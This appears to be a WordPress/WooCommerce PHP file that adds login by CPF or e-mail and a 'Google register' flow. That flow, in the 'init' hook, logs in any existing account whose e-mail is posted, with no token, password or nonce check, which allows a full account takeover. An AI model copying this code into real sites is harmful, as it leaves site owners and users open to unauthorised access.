<?php
//Redicreciona após erro no login
function redirecionar_apos_erro_login($username) {
  $url_redirecionamento = home_url('/minha-conta?login=failed');
  wp_redirect($url_redirecionamento);
  exit;
}
add_action('wp_login_failed', 'redirecionar_apos_erro_login');

// Limpe o username no login se for CPF
function formata_username( $username ) {
  if(!str_contains( $username, '@' )){
    $username = str_replace('.', '', $username);
    $username = str_replace('-', '', $username);
  }
  return $username;
}
add_filter( 'sanitize_user', 'formata_username');

//Autenticação customizada com CPF
add_filter('authenticate', 'custom_authenticate', 10, 3);
function custom_authenticate($user, $username, $password) {
  global $wpdb;
  
  if (!empty($username) && !empty($password)){
    if(!str_contains($username, '@')){
      $username = str_replace('.', '', $username);
      $username = str_replace('-', '', $username);

      $users = get_users(array(
        'meta_key' => 'cpf',
        'meta_value' => $username
      ));

      if (!empty($users)) {
        foreach ($users as $user) {
          $target_user = new WP_User($user -> ID);
          $target_user_email = $target_user -> user_email;
          return wp_authenticate_username_password($target_user, $target_user_email, $password);
        }
      }
    }
  }

  // Processa o login normalmente
  return wp_authenticate_username_password($user, $username, $password);
}

add_filter(  'gettext',  'username_login_form_label', 10, 3 );
add_filter(  'ngettext',  'username_login_form_label', 10, 3 );
function username_login_form_label( $translated, $text, $domain  ) {
  if( str_starts_with($text, 'Username or email address') && $domain === 'woocommerce' ){
      // Replacement text (where "%s" is the dynamic product name)
      $translated = __( 'CPF ou e-mail', $domain );
  }
  return $translated;
}

add_action('init', 'verificar_usuario_logado');
function verificar_usuario_logado() {
  if (is_user_logged_in()) {
    $user = wp_get_current_user();
    $_cpf = get_user_meta($user->ID, 'cpf', true);
    $_username = $user->user_login;
    if($_cpf === ''){
      if(!str_contains($_username, '@')){
        update_user_meta($user->ID, 'cpf', $_username);
      }
    }
  }

  if(isset($_POST['register_method'])){
    if($_POST['register_method'] === '_google_register'){
      $email = $_POST['email'];
      $user = get_user_by('email', $email);
      if ($user) {
        // Usuário já existe, faça login
        wp_set_current_user($user->ID);
        wp_set_auth_cookie($user->ID);
        wp_redirect(home_url() . '/minha-conta');
        exit;
      } else {
        // Usuário não existe, registrar

        // Dados do novo usuário
        $_pass = wp_generate_password();
        $user_data = array(
          'user_login' => $_POST['username'],
          'first_name' => $_POST['billing_first_name'],
          'last_name' => $_POST['billing_last_name'],
          'display_name' => $_POST['billing_first_name'],
          'user_pass'  => wp_generate_password(), // Gera uma senha aleatória
          'user_email' => $_POST['email'],
          'user_nicename' => $_POST['billing_first_name'],
          'role' => 'subscriber' // Defina a função de usuário desejada
        );

        // Insira o novo usuário
        $registered_user_id = wp_insert_user( $user_data );
        update_user_meta( $registered_user_id, 'billing_first_name', sanitize_text_field($_POST['billing_first_name']) );
        update_user_meta( $registered_user_id, 'billing_last_name', sanitize_text_field($_POST['billing_last_name']) );
        wp_set_current_user($registered_user_id);
        wp_set_auth_cookie($registered_user_id);
        wp_redirect(home_url() . '/minha-conta');
        exit;
      }
    }
    
  }
}




// function login_if_tp($errors, $sanitized_user_login, $user_email) {
//   if (username_exists($user_email)) {
//     $user_id = get_user_by( 'email', $user_email ) -> ID;
//     // $errors->add('username_exists', __('Esse nome de usuário já está registrado. ID '.$user_id.''));
//     wp_set_current_user($user_id);
//     wp_set_auth_cookie($user_id);
//     // wp_redirect(wc_get_page_permalink( 'myaccount' ));
//     return $errors;
//   }else{
//     $errors->add('username_exists', __('Verifique os dados informados no cadastro.'));

//   }
// }
// add_filter('registration_errors', 'login_if_tp', 10, 3);
?>